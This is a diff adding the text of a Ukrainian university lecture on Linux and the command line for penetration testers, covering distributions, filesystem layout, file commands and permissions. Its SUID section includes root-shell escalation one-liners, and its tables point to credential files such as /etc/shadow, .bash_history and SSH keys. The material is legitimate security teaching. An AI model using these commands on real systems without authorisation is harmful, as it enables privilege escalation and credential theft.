@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 2: Linux та командний рядок для хакера — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 2: Linux та командний рядок для хакера — повний текст. Файлова система, права доступу, пакети, фільтрація, мережеві утиліти.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 2. Linux та командний рядок для хакера</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,11 +69,1512 @@
       <h1>Linux та командний рядок для хакера</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>2.1 Чому Linux є стандартом для пентесту</h2>
+        <p>Для більшості завдань у сфері тестування на проникнення та кібербезпеки операційна система <strong>Linux</strong> є безумовним стандартом. Розуміння того, чому саме Linux, а не Windows чи macOS, є домінантною платформою для пентестерів, є важливою передумовою для ефективного навчання.</p>
+
+        <h3>Історія Linux у безпеці</h3>
+        <p>Linux бере свій початок у 1991 році, коли Лінус Торвальдс випустив перше ядро. Побудований на принципах UNIX та філософії відкритого коду (open-source), Linux швидко став основою для серверної інфраструктури, вбудованих систем і, зрештою, інструментів кібербезпеки.</p>
+        <p>Ключовою подією стала поява спеціалізованих дистрибутивів для безпеки:</p>
+        <ul>
+          <li><strong>BackTrack</strong> (2006) — перший популярний дистрибутив для пентесту, заснований на Ubuntu. Об'єднав сотні інструментів безпеки в одну систему.</li>
+          <li><strong>Kali Linux</strong> (2013) — наступник BackTrack, розроблений командою Offensive Security (OffSec). Перебудований на базі Debian з нуля.</li>
+          <li><strong>Parrot OS</strong> (2013) — альтернатива Kali, також на базі Debian, з акцентом на приватність і легкість.</li>
+        </ul>
+        <p>Філософія відкритого коду означає, що будь-хто може переглядати, модифікувати та розповсюджувати вихідний код. Для безпеки це критично: інструменти з відкритим кодом можна аудитувати на предмет бекдорів, а ядро системи — адаптувати під конкретні потреби тестування.</p>
+
+        <h3>Kali Linux</h3>
+        <p><strong>Kali Linux</strong> — це провідний дистрибутив для тестування на проникнення, розроблений і підтримуваний компанією <strong>Offensive Security</strong> (OffSec). Він використовується як основна платформа для курсів OSCP, OSWE та OSEP.</p>
+        <p>Ключові характеристики Kali Linux:</p>
+        <ul>
+          <li>Базується на <strong>Debian Testing</strong> (rolling release — постійне оновлення)</li>
+          <li>Містить понад <strong>600 попередньо встановлених інструментів</strong> безпеки</li>
+          <li>Підтримує архітектури AMD64, ARM (Raspberry Pi), мобільні пристрої (Kali NetHunter)</li>
+          <li>Доступний як ISO-образ, образ для VM, Docker-контейнер, WSL (Windows Subsystem for Linux)</li>
+          <li>За замовчуванням використовує середовище робочого столу XFCE (раніше GNOME)</li>
+          <li>З 2020 року за замовчуванням працює від звичайного користувача (не root), що є кращою практикою безпеки</li>
+        </ul>
+        <p>Kali організовує інструменти через <strong>метапакети</strong> — групи пакетів, об'єднаних за призначенням:</p>
+        <table>
+          <tr>
+            <th>Метапакет</th>
+            <th>Опис</th>
+            <th>Приклади інструментів</th>
+          </tr>
+          <tr>
+            <td><code>kali-linux-default</code></td>
+            <td>Стандартний набір інструментів (встановлюється з ISO)</td>
+            <td>Nmap, Metasploit, Burp Suite, Wireshark, John</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-web</code></td>
+            <td>Інструменти для тестування веб-додатків</td>
+            <td>SQLMap, Nikto, WPScan, Dirb, Gobuster</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-wireless</code></td>
+            <td>Інструменти для бездротових мереж</td>
+            <td>Aircrack-ng, Reaver, Wifite, Fern WiFi Cracker</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-passwords</code></td>
+            <td>Інструменти для атак на паролі</td>
+            <td>Hashcat, John the Ripper, Hydra, Medusa</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-exploitation</code></td>
+            <td>Фреймворки експлуатації</td>
+            <td>Metasploit, SearchSploit, BeEF</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-sniffing-spoofing</code></td>
+            <td>Перехоплення та підміна трафіку</td>
+            <td>Wireshark, Ettercap, Responder, mitmproxy</td>
+          </tr>
+          <tr>
+            <td><code>kali-tools-forensics</code></td>
+            <td>Цифрова криміналістика</td>
+            <td>Autopsy, Volatility, Binwalk, Foremost</td>
+          </tr>
+          <tr>
+            <td><code>kali-linux-everything</code></td>
+            <td>Всі доступні інструменти Kali (~30 ГБ)</td>
+            <td>Все перелічене вище та більше</td>
+          </tr>
+        </table>
+        <p>Встановити конкретний метапакет можна командою:</p>
+        <pre><code>sudo apt install kali-tools-web</code></pre>
+
+        <h3>Parrot OS</h3>
+        <p><strong>Parrot OS</strong> (Parrot Security) — альтернативний дистрибутив, також побудований на базі Debian. Розробляється командою Parrot Security і пропонує два основні видання:</p>
+        <ul>
+          <li><strong>Parrot Security Edition</strong> — повний набір інструментів для пентесту, аналогічний до Kali</li>
+          <li><strong>Parrot Home Edition</strong> — легка версія для щоденного використання з акцентом на приватність</li>
+        </ul>
+        <p>Parrot відрізняється від Kali меншим споживанням ресурсів (використовує робоче середовище MATE), вбудованими інструментами приватності (AnonSurf для маршрутизації трафіку через Tor) та підтримкою режиму Sandbox для ізольованого запуску додатків.</p>
+
+        <h3>Переваги Linux над Windows для пентесту</h3>
+        <ul>
+          <li><strong>Відкритий код</strong> — повний контроль над системою, можливість аудиту та модифікації</li>
+          <li><strong>Потужна командна оболонка (Bash/Zsh)</strong> — скриптинг, конвеєри (pipes), автоматизація завдань, що критично для ефективного пентесту</li>
+          <li><strong>Нативна підтримка мережевих інструментів</strong> — Nmap, Netcat, Wireshark, tcpdump працюють нативно, без додаткових обгорток</li>
+          <li><strong>Файлова система /proc</strong> — віртуальна файлова система, що надає інформацію про процеси, ядро та апаратне забезпечення у реальному часі</li>
+          <li><strong>Привілеї та контроль доступу</strong> — гнучка модель прав (rwx, SUID, capabilities), важлива для розуміння вразливостей підвищення привілеїв</li>
+          <li><strong>Пакетні менеджери</strong> — швидке встановлення та оновлення інструментів через APT</li>
+          <li><strong>Спільнота</strong> — більшість інструментів безпеки та експлойтів розробляються під Linux</li>
+          <li><strong>Серверна домінантність</strong> — понад 90% веб-серверів працюють на Linux; знання Linux необхідне для розуміння цілей атаки</li>
+        </ul>
+
+        <h3>Порівняння платформ для пентесту</h3>
+        <table>
+          <tr>
+            <th>Параметр</th>
+            <th>Kali Linux</th>
+            <th>Parrot OS</th>
+            <th>Windows</th>
+          </tr>
+          <tr>
+            <td>Базовий дистрибутив</td>
+            <td>Debian Testing</td>
+            <td>Debian Stable</td>
+            <td>N/A (пропрієтарна)</td>
+          </tr>
+          <tr>
+            <td>Кількість інструментів</td>
+            <td>600+</td>
+            <td>500+</td>
+            <td>Потребує ручного встановлення</td>
+          </tr>
+          <tr>
+            <td>Споживання RAM</td>
+            <td>~1 ГБ (XFCE)</td>
+            <td>~0.5 ГБ (MATE)</td>
+            <td>~2–4 ГБ</td>
+          </tr>
+          <tr>
+            <td>Командна оболонка</td>
+            <td>Bash/Zsh (потужна)</td>
+            <td>Bash/Zsh (потужна)</td>
+            <td>CMD/PowerShell (обмежена для пентесту)</td>
+          </tr>
+          <tr>
+            <td>Інструменти приватності</td>
+            <td>Мінімальні</td>
+            <td>AnonSurf, Tor, Sandbox</td>
+            <td>Немає</td>
+          </tr>
+          <tr>
+            <td>Підтримка</td>
+            <td>OffSec (комерційна)</td>
+            <td>Спільнота</td>
+            <td>Microsoft</td>
+          </tr>
+          <tr>
+            <td>Ідеально для</td>
+            <td>Пентест, OSCP</td>
+            <td>Пентест + щоденне використання</td>
+            <td>Active Directory атаки, C2 фреймворки</td>
+          </tr>
+        </table>
+        <p>Варто зазначити, що Windows також має свою нішу в пентесті: атаки на Active Directory, запуск C2-фреймворків (Cobalt Strike), тестування Windows-специфічних вразливостей. Однак для загального навчання Linux залишається стандартом.</p>
+      </section>
+
+      <section>
+        <h2>2.2 Файлова система Linux (FHS)</h2>
+        <p>Файлова система Linux побудована за стандартом <strong>FHS</strong> (Filesystem Hierarchy Standard), який визначає структуру та призначення кожного каталогу. Розуміння цієї структури є критично важливим для пентестера, оскільки знання того, де шукати конфігурації, логи та конфіденційні файли, безпосередньо впливає на ефективність тестування.</p>
+
+        <h3>Принцип "Все є файл"</h3>
+        <p>В Linux діє фундаментальний принцип UNIX: <strong>"Everything is a file"</strong> — все є файлом. Цей принцип означає, що не тільки звичайні файли та каталоги, але й пристрої (диски, клавіатура, мережеві інтерфейси), процеси та навіть системна інформація представлені як файли, до яких можна звертатися стандартними операціями читання/запису.</p>
+        <ul>
+          <li>Жорсткий диск — це файл <code>/dev/sda</code></li>
+          <li>Інформація про процесор — файл <code>/proc/cpuinfo</code></li>
+          <li>Генератор випадкових чисел — файл <code>/dev/urandom</code></li>
+          <li>"Чорна діра" для даних — файл <code>/dev/null</code></li>
+        </ul>
+        <p>Це спрощує роботу: один і той самий набір команд (<code>cat</code>, <code>echo</code>, <code>read</code>) працює і з файлами, і з пристроями, і з системною інформацією.</p>
+
+        <h3>Основні каталоги</h3>
+        <table>
+          <tr>
+            <th>Каталог</th>
+            <th>Призначення</th>
+            <th>Цікаво для пентестера</th>
+          </tr>
+          <tr>
+            <td><code>/</code></td>
+            <td>Корінь файлової системи. Всі інші каталоги є її підкаталогами.</td>
+            <td>Точка відліку для всіх абсолютних шляхів</td>
+          </tr>
+          <tr>
+            <td><code>/etc</code></td>
+            <td>Конфігураційні файли системи та сервісів</td>
+            <td>Паролі, конфігурації сервісів, мережеві налаштування</td>
+          </tr>
+          <tr>
+            <td><code>/home</code></td>
+            <td>Домашні каталоги користувачів (<code>/home/user</code>)</td>
+            <td>SSH-ключі, історія команд, особисті файли</td>
+          </tr>
+          <tr>
+            <td><code>/root</code></td>
+            <td>Домашній каталог суперкористувача root</td>
+            <td>Привілейовані конфігурації, ключі, скрипти</td>
+          </tr>
+          <tr>
+            <td><code>/var</code></td>
+            <td>Змінні дані: логи, кеш, бази даних, пошта</td>
+            <td>Логи для аналізу, тимчасові дані веб-серверів</td>
+          </tr>
+          <tr>
+            <td><code>/var/log</code></td>
+            <td>Системні та прикладні журнали (логи)</td>
+            <td>auth.log, syslog, apache2/access.log — сліди атак</td>
+          </tr>
+          <tr>
+            <td><code>/tmp</code></td>
+            <td>Тимчасові файли, доступні всім користувачам</td>
+            <td>Місце для завантаження експлойтів, world-writable</td>
+          </tr>
+          <tr>
+            <td><code>/proc</code></td>
+            <td>Віртуальна файлова система з інформацією про процеси та ядро</td>
+            <td>Версія ядра, список процесів, мережеві з'єднання</td>
+          </tr>
+          <tr>
+            <td><code>/dev</code></td>
+            <td>Файли пристроїв (диски, термінали, генератори)</td>
+            <td>/dev/null, /dev/tcp для мережевих з'єднань</td>
+          </tr>
+          <tr>
+            <td><code>/bin</code></td>
+            <td>Основні виконувані файли (ls, cp, cat, bash)</td>
+            <td>Базові команди, доступні всім користувачам</td>
+          </tr>
+          <tr>
+            <td><code>/sbin</code></td>
+            <td>Системні виконувані файли (ifconfig, iptables, fdisk)</td>
+            <td>Адміністративні команди, зазвичай потребують root</td>
+          </tr>
+          <tr>
+            <td><code>/usr</code></td>
+            <td>Вторинна ієрархія: програми, бібліотеки, документація</td>
+            <td>/usr/share/wordlists (словники в Kali)</td>
+          </tr>
+          <tr>
+            <td><code>/opt</code></td>
+            <td>Додатково встановлене ПЗ (сторонні програми)</td>
+            <td>Часто тут встановлюються інструменти безпеки</td>
+          </tr>
+        </table>
+
+        <h3>Файли, критичні для безпеки</h3>
+        <p>Під час тестування на проникнення є низка файлів, які пентестер перевіряє в першу чергу після отримання доступу до системи:</p>
+        <table>
+          <tr>
+            <th>Файл</th>
+            <th>Опис</th>
+            <th>Приклад вмісту</th>
+          </tr>
+          <tr>
+            <td><code>/etc/passwd</code></td>
+            <td>Список усіх користувачів системи. Доступний для читання всім.</td>
+            <td><code>root:x:0:0:root:/root:/bin/bash</code></td>
+          </tr>
+          <tr>
+            <td><code>/etc/shadow</code></td>
+            <td>Хеші паролів. Доступний лише root.</td>
+            <td><code>root:$6$salt$hash...:19000:0:99999:7:::</code></td>
+          </tr>
+          <tr>
+            <td><code>/etc/sudoers</code></td>
+            <td>Правила sudo: хто може виконувати які команди від root.</td>
+            <td><code>user ALL=(ALL) NOPASSWD: /usr/bin/vim</code></td>
+          </tr>
+          <tr>
+            <td><code>/var/log/auth.log</code></td>
+            <td>Журнал аутентифікації: логіни, sudo, SSH-спроби.</td>
+            <td>Записи про невдалі спроби входу</td>
+          </tr>
+          <tr>
+            <td><code>/proc/version</code></td>
+            <td>Версія ядра Linux (для пошуку kernel exploits).</td>
+            <td><code>Linux version 5.15.0-kali1-amd64</code></td>
+          </tr>
+          <tr>
+            <td><code>/etc/hosts</code></td>
+            <td>Локальна таблиця DNS-розіменування.</td>
+            <td><code>192.168.1.10 target.local</code></td>
+          </tr>
+          <tr>
+            <td><code>/etc/crontab</code></td>
+            <td>Планувальник завдань. Cron-завдання від root — вектор ескалації.</td>
+            <td><code>* * * * * root /opt/backup.sh</code></td>
+          </tr>
+          <tr>
+            <td><code>~/.bash_history</code></td>
+            <td>Історія команд користувача. Може містити паролі в відкритому вигляді.</td>
+            <td><code>mysql -u admin -p password123</code></td>
+          </tr>
+          <tr>
+            <td><code>~/.ssh/id_rsa</code></td>
+            <td>Приватний SSH-ключ. Дозволяє авторизуватися без пароля.</td>
+            <td>Приватний ключ RSA</td>
+          </tr>
+        </table>
+
+        <h3>Абсолютні та відносні шляхи</h3>
+        <p>У Linux існують два способи вказати розташування файлу:</p>
+        <ul>
+          <li><strong>Абсолютний шлях</strong> — починається від кореня <code>/</code> і вказує повний маршрут: <code>/home/kali/Documents/report.txt</code></li>
+          <li><strong>Відносний шлях</strong> — вказується відносно поточного каталогу: <code>Documents/report.txt</code> (якщо ми вже в <code>/home/kali</code>)</li>
+        </ul>
+        <p>Спеціальні позначення:</p>
+        <ul>
+          <li><code>.</code> — поточний каталог</li>
+          <li><code>..</code> — батьківський каталог (на один рівень вгору)</li>
+          <li><code>~</code> — домашній каталог поточного користувача</li>
+          <li><code>-</code> — попередній каталог (використовується з <code>cd</code>)</li>
+        </ul>
+        <pre><code># Абсолютний шлях
+cat /etc/passwd
+
+# Відносний шлях (якщо ми в /etc)
+cat passwd
+
+# Перехід на рівень вгору і потім у каталог
+cat ../var/log/auth.log
+
+# Домашній каталог
+cat ~/.bash_history</code></pre>
+      </section>
+
+      <section>
+        <h2>2.3 Навігація та робота з файлами</h2>
+        <p>Командний рядок Linux (термінал, shell) — це основний інтерфейс пентестера. На відміну від графічного інтерфейсу, термінал надає повний контроль над системою, дозволяє автоматизувати завдання та працювати з віддаленими серверами через SSH. Опанування базових команд є обов'язковою навичкою.</p>
+
+        <h3>Навігація по файловій системі</h3>
+        <p><code>pwd</code> (print working directory) — відображає абсолютний шлях до поточного каталогу:</p>
+        <pre><code>$ pwd
+/home/kali</code></pre>
+
+        <p><code>cd</code> (change directory) — зміна поточного каталогу:</p>
+        <pre><code># Перейти в каталог
+cd /var/log
+
+# Повернутися в домашній каталог
+cd ~
+cd      # те ж саме, без аргументів
+
+# На один рівень вгору
+cd ..
+
+# Повернутися в попередній каталог
+cd -</code></pre>
+
+        <p><code>ls</code> (list) — перегляд вмісту каталогу. Найбільш використовувані прапорці:</p>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><code>-l</code></td>
+            <td>Довгий формат: права, власник, розмір, дата</td>
+          </tr>
+          <tr>
+            <td><code>-a</code></td>
+            <td>Показати приховані файли (починаються з <code>.</code>)</td>
+          </tr>
+          <tr>
+            <td><code>-h</code></td>
+            <td>Розміри у зрозумілому форматі (KB, MB, GB)</td>
+          </tr>
+          <tr>
+            <td><code>-R</code></td>
+            <td>Рекурсивний перегляд підкаталогів</td>
+          </tr>
+          <tr>
+            <td><code>-t</code></td>
+            <td>Сортувати за часом модифікації</td>
+          </tr>
+          <tr>
+            <td><code>-S</code></td>
+            <td>Сортувати за розміром</td>
+          </tr>
+        </table>
+        <pre><code># Повний перегляд з прихованими файлами
+ls -la
+
+# З розмірами у зрозумілому форматі
+ls -lah
+
+# Рекурсивний перегляд
+ls -R /etc/apache2/
+
+# Приклад виводу ls -la:
+drwxr-xr-x  2 kali kali  4096 Jan 15 10:30 Documents
+-rw-r--r--  1 kali kali  1234 Jan 15 09:00 notes.txt
+-rwxr-xr-x  1 kali kali   512 Jan 14 15:22 scan.sh</code></pre>
+
+        <h3>Перегляд вмісту файлів</h3>
+        <p><code>cat</code> — вивести весь вміст файлу. Підходить для коротких файлів:</p>
+        <pre><code>cat /etc/hostname
+cat /etc/passwd</code></pre>
+
+        <p><code>less</code> — посторінковий перегляд (для великих файлів). Навігація: <code>Space</code> — наступна сторінка, <code>b</code> — назад, <code>/pattern</code> — пошук, <code>q</code> — вихід:</p>
+        <pre><code>less /var/log/syslog</code></pre>
+
+        <p><code>head</code> та <code>tail</code> — перегляд початку чи кінця файлу:</p>
+        <pre><code># Перші 20 рядків
+head -n 20 /etc/passwd
+
+# Останні 10 рядків
+tail -n 10 /var/log/auth.log
+
+# Режим "стежити за файлом" — вивід нових рядків у реальному часі
+# Критично для моніторингу логів під час атаки
+tail -f /var/log/auth.log</code></pre>
+        <p>Команда <code>tail -f</code> особливо корисна при пентесті: можна моніторити логи цільової системи в реальному часі, щоб спостерігати за реакцією на свої дії.</p>
+
+        <h3>Операції з файлами та каталогами</h3>
+        <p><code>cp</code> — копіювання файлів і каталогів:</p>
+        <pre><code># Копіювання файлу
+cp /etc/passwd /tmp/passwd_backup
+
+# Рекурсивне копіювання каталогу
+cp -r /var/log/ /tmp/logs_backup/</code></pre>
+
+        <p><code>mv</code> — переміщення або перейменування:</p>
+        <pre><code># Перемістити файл
+mv report.txt /home/kali/Documents/
+
+# Перейменувати файл
+mv scan_results.txt nmap_scan_20240115.txt</code></pre>
+
+        <p><code>rm</code> — видалення файлів і каталогів:</p>
+        <pre><code># Видалити файл
+rm old_file.txt
+
+# Видалити каталог рекурсивно та без підтвердження
+rm -rf /tmp/old_directory/
+
+# Обережно! rm -rf / знищить всю систему
+# Завжди перевіряйте шлях перед виконанням rm -rf</code></pre>
+
+        <p><code>mkdir</code> та <code>touch</code> — створення каталогів і файлів:</p>
+        <pre><code># Створити каталог
+mkdir results
+
+# Створити вкладену ієрархію каталогів
+mkdir -p project/scans/nmap
+
+# Створити порожній файл або оновити час модифікації
+touch notes.txt</code></pre>
+
+        <h3>Пошук файлів</h3>
+        <p><code>find</code> — потужна команда пошуку файлів за різними критеріями. Це один з найважливіших інструментів для пентестера при роботі з файловою системою:</p>
+        <pre><code># Пошук за іменем
+find / -name "passwd" 2>/dev/null
+
+# Пошук за типом (f = файл, d = каталог)
+find /etc -type f -name "*.conf"
+
+# Пошук файлів з SUID-бітом — ключовий вектор ескалації привілеїв!
+find / -perm -4000 -type f 2>/dev/null
+
+# Пошук файлів, доступних для запису всім
+find / -writable -type f 2>/dev/null
+
+# Пошук файлів, модифікованих за останні 7 днів
+find /var/log -mtime -7
+
+# Пошук файлів за власником
+find / -user root -perm -4000 2>/dev/null
+
+# Пошук файлів за розміром (більше 100 MB)
+find / -size +100M 2>/dev/null</code></pre>
+        <p>Примітка: <code>2>/dev/null</code> перенаправляє повідомлення про помилки (наприклад, "Permission denied") у нікуди, щоб очистити вивід.</p>
+
+        <p><code>locate</code> — швидкий пошук за індексованою базою даних (потребує попереднього запуску <code>updatedb</code>):</p>
+        <pre><code># Оновити базу даних
+sudo updatedb
+
+# Шукати файл
+locate rockyou.txt</code></pre>
+
+        <p><code>which</code> та <code>whereis</code> — пошук виконуваних файлів:</p>
+        <pre><code># Шлях до виконуваного файлу
+which nmap
+# /usr/bin/nmap
+
+# Виконуваний файл + man-сторінки + вихідний код
+whereis python3
+# python3: /usr/bin/python3 /usr/lib/python3 /usr/share/man/man1/python3.1.gz</code></pre>
+
+        <h3>Інформація про файли</h3>
+        <p><code>file</code> — визначення типу файлу (за вмістом, не за розширенням):</p>
+        <pre><code>$ file /usr/bin/nmap
+/usr/bin/nmap: ELF 64-bit LSB pie executable, x86-64
+
+$ file image.png
+image.png: PNG image data, 800 x 600, 8-bit/color RGBA
+
+# Корисно для аналізу підозрілих файлів
+$ file suspicious.pdf
+suspicious.pdf: PE32 executable (GUI) Intel 80386  # Це не PDF, а EXE!</code></pre>
+
+        <p><code>strings</code> — витягування текстових рядків з бінарних файлів. Критично для реверс-інженерії та аналізу зловмисного ПЗ:</p>
+        <pre><code># Знайти читабельні рядки в бінарному файлі
+strings /usr/bin/nmap | head -20
+
+# Пошук URL, паролів чи ключів у бінарному файлі
+strings suspicious_binary | grep -i "password"
+strings suspicious_binary | grep -E "https?://"</code></pre>
+
+        <p><code>stat</code> — детальна інформація про файл (розмір, права, часові мітки):</p>
+        <pre><code>$ stat /etc/passwd
+  File: /etc/passwd
+  Size: 2834      Blocks: 8      IO Block: 4096   regular file
+Access: (0644/-rw-r--r--)  Uid: (0/root)   Gid: (0/root)
+Access: 2024-01-15 10:30:00.000000000 +0200
+Modify: 2024-01-10 08:15:22.000000000 +0200
+Change: 2024-01-10 08:15:22.000000000 +0200</code></pre>
+
+        <h3>Шаблони підстановки (Wildcards)</h3>
+        <p>Wildcards дозволяють працювати з групами файлів за шаблоном:</p>
+        <table>
+          <tr>
+            <th>Шаблон</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><code>*</code></td>
+            <td>Будь-яка кількість будь-яких символів</td>
+            <td><code>ls *.txt</code> — всі .txt файли</td>
+          </tr>
+          <tr>
+            <td><code>?</code></td>
+            <td>Один будь-який символ</td>
+            <td><code>ls file?.txt</code> — file1.txt, fileA.txt</td>
+          </tr>
+          <tr>
+            <td><code>[abc]</code></td>
+            <td>Один символ з переліку</td>
+            <td><code>ls file[123].txt</code> — file1.txt, file2.txt</td>
+          </tr>
+          <tr>
+            <td><code>[a-z]</code></td>
+            <td>Один символ з діапазону</td>
+            <td><code>ls log.[0-9]</code> — log.1, log.2</td>
+          </tr>
+          <tr>
+            <td><code>[!abc]</code></td>
+            <td>Один символ, що NOT в переліку</td>
+            <td><code>ls file[!0-9].txt</code> — fileA.txt</td>
+          </tr>
+        </table>
+        <pre><code># Видалити всі .log файли
+rm /tmp/*.log
+
+# Скопіювати файли scan1.txt — scan9.txt
+cp scan[1-9].txt /results/
+
+# Всі конфігураційні файли Apache
+ls /etc/apache2/sites-*/*.conf</code></pre>
+      </section>
+
+      <section>
+        <h2>2.4 Права доступу та користувачі</h2>
+        <p>Модель прав доступу Linux є одним з наріжних каменів безпеки операційної системи. Для пентестера розуміння прав критично важливе у двох напрямках: пошук вразливостей ескалації привілеїв (privilege escalation) та забезпечення безпеки власних систем.</p>
+
+        <h3>Концепція User / Group / Other</h3>
+        <p>Кожен файл та каталог у Linux має три рівні прав доступу:</p>
+        <ul>
+          <li><strong>User (u)</strong> — власник файлу</li>
+          <li><strong>Group (g)</strong> — група, до якої належить файл</li>
+          <li><strong>Other (o)</strong> — всі інші користувачі системи</li>
+        </ul>
+        <p>Для кожного рівня визначені три типи дозволів:</p>
+        <ul>
+          <li><strong>r (read)</strong> — читання: перегляд вмісту файлу або списку каталогу</li>
+          <li><strong>w (write)</strong> — запис: зміна файлу або створення/видалення файлів у каталозі</li>
+          <li><strong>x (execute)</strong> — виконання: запуск файлу як програми або вхід у каталог</li>
+        </ul>
+        <p>Приклад виводу <code>ls -la</code>:</p>
+        <pre><code>-rwxr-xr--  1 kali kali  4096 Jan 15 10:30 script.sh
+│└┬┘└┬┘└┬┘
+│ │   │   │
+│ │   │   └── Other: r-- (тільки читання)
+│ │   └────── Group: r-x (читання + виконання)
+│ └────────── User:  rwx (читання + запис + виконання)
+└──────────── Тип: - (файл), d (каталог), l (символічне посилання)</code></pre>
+
+        <h3>Команда chmod — зміна прав доступу</h3>
+        <p><strong>Числовий (октальний) формат:</strong></p>
+        <table>
+          <tr>
+            <th>Число</th>
+            <th>Права</th>
+            <th>Двійковий</th>
+          </tr>
+          <tr>
+            <td><code>0</code></td>
+            <td><code>---</code> (нічого)</td>
+            <td>000</td>
+          </tr>
+          <tr>
+            <td><code>1</code></td>
+            <td><code>--x</code> (виконання)</td>
+            <td>001</td>
+          </tr>
+          <tr>
+            <td><code>2</code></td>
+            <td><code>-w-</code> (запис)</td>
+            <td>010</td>
+          </tr>
+          <tr>
+            <td><code>3</code></td>
+            <td><code>-wx</code> (запис + виконання)</td>
+            <td>011</td>
+          </tr>
+          <tr>
+            <td><code>4</code></td>
+            <td><code>r--</code> (читання)</td>
+            <td>100</td>
+          </tr>
+          <tr>
+            <td><code>5</code></td>
+            <td><code>r-x</code> (читання + виконання)</td>
+            <td>101</td>
+          </tr>
+          <tr>
+            <td><code>6</code></td>
+            <td><code>rw-</code> (читання + запис)</td>
+            <td>110</td>
+          </tr>
+          <tr>
+            <td><code>7</code></td>
+            <td><code>rwx</code> (всі права)</td>
+            <td>111</td>
+          </tr>
+        </table>
+        <p>Найпоширеніші комбінації:</p>
+        <pre><code># 755 = rwxr-xr-x (скрипти, програми)
+chmod 755 script.sh
+
+# 644 = rw-r--r-- (конфігураційні файли, документи)
+chmod 644 config.txt
+
+# 600 = rw------- (приватні ключі SSH)
+chmod 600 ~/.ssh/id_rsa
+
+# 777 = rwxrwxrwx (НЕБЕЗПЕЧНО! Всі мають повний доступ)
+chmod 777 shared_file  # Ніколи не робіть на production</code></pre>
+
+        <p><strong>Символьний формат:</strong></p>
+        <pre><code># Додати виконання для власника
+chmod u+x script.sh
+
+# Забрати запис для групи та інших
+chmod go-w file.txt
+
+# Встановити читання для всіх
+chmod a+r document.txt
+
+# Рекурсивна зміна прав
+chmod -R 755 /var/www/html/</code></pre>
+
+        <h3>Команда chown — зміна власника</h3>
+        <pre><code># Змінити власника файлу
+sudo chown root:root /etc/important.conf
+
+# Змінити власника та групу
+sudo chown www-data:www-data /var/www/html/index.html
+
+# Рекурсивна зміна
+sudo chown -R kali:kali /home/kali/project/</code></pre>
+
+        <h3>Спеціальні біти: SUID, SGID, Sticky Bit</h3>
+        <p>Окрім стандартних прав rwx, існують три спеціальні біти, які мають критичне значення для безпеки системи:</p>
+
+        <p><strong>SUID (Set User ID) — біт 4000</strong></p>
+        <p>Коли SUID встановлений на виконуваному файлі, програма запускається з правами <strong>власника файлу</strong>, а не користувача, який її запустив. Якщо власник — root, будь-який користувач запускає програму з root-привілеями.</p>
+        <pre><code># Приклад: /usr/bin/passwd має SUID
+ls -la /usr/bin/passwd
+-rwsr-xr-x 1 root root 68208 Jan 15 /usr/bin/passwd
+    ^
+    s = SUID встановлений
+
+# Команда passwd дозволяє звичайному користувачу змінити свій пароль,
+# хоча файл /etc/shadow доступний лише root.</code></pre>
+        <p><strong>Ескалація привілеїв через SUID:</strong> Якщо програма з SUID-бітом має вразливість (або дозволяє виконувати довільні команди), зловмисник може отримати root-доступ. Ресурс <strong>GTFOBins</strong> (gtfobins.github.io) каталогізує такі програми та способи їх експлуатації.</p>
+        <pre><code># Пошук всіх SUID-файлів у системі
+find / -perm -4000 -type f 2>/dev/null
+
+# Приклад: якщо /usr/bin/find має SUID
+find . -exec /bin/bash -p \;  # Запуск bash з root-правами
+
+# Приклад: якщо /usr/bin/vim має SUID
+vim -c ':!bash'  # Вихід у shell з root-правами
+
+# Встановити SUID на файл
+chmod u+s program
+chmod 4755 program</code></pre>
+
+        <p><strong>SGID (Set Group ID) — біт 2000</strong></p>
+        <p>Аналогічно до SUID, але програма виконується з правами <strong>групи</strong> файлу. На каталогах SGID означає, що нові файли в каталозі успадковують його групу, а не групу користувача, який їх створив.</p>
+        <pre><code># SGID на каталозі — нові файли успадковують групу каталогу
+chmod g+s /shared/project/
+chmod 2775 /shared/project/
+
+# Всі файли, створені в /shared/project/, матимуть групу каталогу</code></pre>
+
+        <p><strong>Sticky Bit — біт 1000</strong></p>
+        <p>Коли встановлений на каталозі, тільки власник файлу (або root) може видалити свій файл із цього каталогу, навіть якщо інші мають права на запис. Класичний приклад — каталог <code>/tmp</code>.</p>
+        <pre><code>ls -ld /tmp
+drwxrwxrwt 15 root root 4096 Jan 15 /tmp
+         ^
+         t = Sticky Bit встановлений
+
+# Будь-хто може створити файл у /tmp,
+# але видалити може лише його власник або root.
+
+chmod +t /shared/
+chmod 1777 /shared/</code></pre>
+
+        <h3>Структура /etc/passwd і /etc/shadow</h3>
+        <p>Файл <code>/etc/passwd</code> містить інформацію про всіх користувачів. Кожен рядок має 7 полів, розділених двокрапкою:</p>
+        <pre><code>root:x:0:0:root:/root:/bin/bash
+kali:x:1000:1000:Kali User:/home/kali:/bin/zsh
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+# Структура: username:password:UID:GID:GECOS:home:shell
+# x у полі password означає, що хеш зберігається в /etc/shadow
+# /usr/sbin/nologin — користувач не може ввійти інтерактивно</code></pre>
+
+        <p>Файл <code>/etc/shadow</code> містить хеші паролів (доступний лише root):</p>
